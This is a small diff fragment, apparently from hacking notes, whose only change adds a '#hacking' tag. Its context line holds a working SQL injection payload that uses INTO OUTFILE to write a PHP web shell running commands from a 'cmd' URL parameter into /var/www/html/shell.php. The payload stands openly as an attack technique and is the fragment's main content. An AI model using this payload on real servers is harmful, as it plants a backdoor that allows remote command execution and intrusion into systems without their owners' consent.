@@ -20,4 +20,4 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
 
 Tags:
 
-    
+    #hacking
